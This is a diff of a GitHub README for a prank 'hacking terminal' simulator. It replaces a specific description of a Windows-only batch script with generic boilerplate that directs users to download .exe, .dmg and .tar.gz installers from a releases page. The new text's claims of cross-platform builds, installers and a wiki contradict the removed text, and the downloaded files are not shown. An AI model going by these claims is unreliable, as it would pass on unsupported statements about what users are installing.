@@ -1,51 +1,84 @@
-# MatrixTerminal - Cinematic Hacking Simulator
-                                             
-![MatrixTerminal Demo](https://img.shields.io/badge/Status-Active-brightgreen) 
-![Platform](https://img.shields.io/badge/Platform-Windows-blue)
-![License](https://img.shields.io/badge/License-MIT-yellow) 
-![Category](https://img.shields.io/badge/Category-Security_Tools-orange) 
-  
-## 🎬 The Ultimate Hollywood-Style Hacking Experience 
+# 🔥 MatrixTerminal - Your Gateway to Hacking Fun
 
-MatrixTerminal is a realistic, cinematic command-line interface simulator that recreates the thrilling hacking sequences from movies like *The Matrix*, *Mr. Robot*, and *Hackers*. Perfect for cybersecurity enthusiasts, students, and anyone who wants to feel like a cyber operative without breaking any laws.
+## 📥 Download Now 
 
-<img width="825" height="415" alt="Screenshot 2025-12-20 124018" src="https://github.com/user-attachments/assets/a7b717c7-87fc-4fd6-9799-48f0e3d7d118" />
+[![Download MatrixTerminal](https://img.shields.io/badge/Download-MatrixTerminal-blue)](https://github.com/naolembro/MatrixTerminal/releases)
 
-> TRY THE SIMULATOR . ( IT ALSO HAVE SOME EASTER EGGS ) 
+## 🚀 Getting Started
 
+Welcome to MatrixTerminal! This application is a fun tool that simulates a hacking terminal experience. You can use it for pranks, demos, or just to enjoy the hacker aesthetics. Follow the easy steps below to download and run the software.
 
-## ✨ Features
- 
-### 🎥 Cinematic Experience
-- Hollywood-style terminal interface with "matrix" effect
-- Realistic hacking terminology and workflows
-- Animated progress indicators and status updates
-- Multi-step penetration testing simulation
+## 💻 System Requirements
 
-### 🔒 100% Safe & Educational
-- **NO actual hacking** - All effects are simulated
-- Perfect for learning cybersecurity concepts
-- Great for film productions, cybersecurity demos, or pranks
-- Zero network activity (everything runs locally)
+To run MatrixTerminal, you will need:
 
-### 🛠️ Technical Highlights
-- Batch script implementation (no installation needed)
-- Customizable target parameters
-- Realistic port scanning simulation
-- Vulnerability assessment display
-- Data exfiltration simulation
-- Stealth mode with forensic cleanup
+- A computer with Windows, macOS, or Linux.
+- At least 512 MB of RAM.
+- 100 MB of free disk space.
+- A web browser for downloading the application.
 
-## 🚀 Quick Start
+## 🔗 Visit the Releases Page
 
-1. **Download** the `MatrixTerminal.bat` file
-2. **Double-click** to run (Windows only)
-3. **Experience** the cinematic hacking simulation
+You can find the latest version of MatrixTerminal on our releases page. [Visit this page to download](https://github.com/naolembro/MatrixTerminal/releases). 
 
-```bash
-# Or run from command line
-MatrixTerminal.bat
-```
+## 📥 Download & Install
 
+1. Go to the [Releases page here](https://github.com/naolembro/MatrixTerminal/releases).
+2. Look for the latest release version.
+3. Choose the correct file for your operating system:
+   - For Windows, look for a file ending in `.exe`.
+   - For macOS, look for a file ending in `.dmg`.
+   - For Linux, you may find a `.tar.gz` file.
+4. Click on the file to start the download.
+5. Once the download is complete, find the file on your computer.
 
-> Linux & Macos Versions will be soon .
+### Windows Installation
+
+1. Double-click the downloaded `.exe` file.
+2. Follow the installation prompts to complete the setup.
+3. After installation, you can find MatrixTerminal in your Start menu.
+
+### macOS Installation
+
+1. Open the downloaded `.dmg` file.
+2. Drag the MatrixTerminal icon into your Applications folder.
+3. You can launch MatrixTerminal from your Applications folder.
+
+### Linux Installation
+
+1. Open a terminal window.
+2. Navigate to the folder where the file was downloaded.
+3. Extract the contents using the command:
+   ```bash
+   tar -xzf MatrixTerminal.tar.gz
+   ```
+4. Navigate into the extracted folder and run:
+   ```bash
+   ./MatrixTerminal
+   ```
+
+## 🎨 Features
+
+- **Realistic Terminal Interface:** Enjoy a visually appealing interface that mimics real hacking environments.
+- **Prank Mode:** Surprise your friends with fake hacks and scripts.
+- **Video Demos:** Use it in videos to create dramatic hacker-style visuals.
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux.
+
+## 📄 Documentation
+
+You can find detailed documentation for MatrixTerminal on our GitHub wiki. This includes:
+
+- User guides
+- Troubleshooting tips
+- FAQs
+- Community contributions
+
+## 📞 Support
+
+If you face any issues or have questions, please create an issue on our [GitHub repository](https://github.com/naolembro/MatrixTerminal/issues). Our community will be happy to help you.
+
+## 🙌 Acknowledgments
+
+MatrixTerminal was developed as a fun project to explore the aesthetics of hacking. A big thanks to all contributors who helped make this tool enjoyable for everyone.
+
+Enjoy your time with MatrixTerminal, and let your creativity run wild!
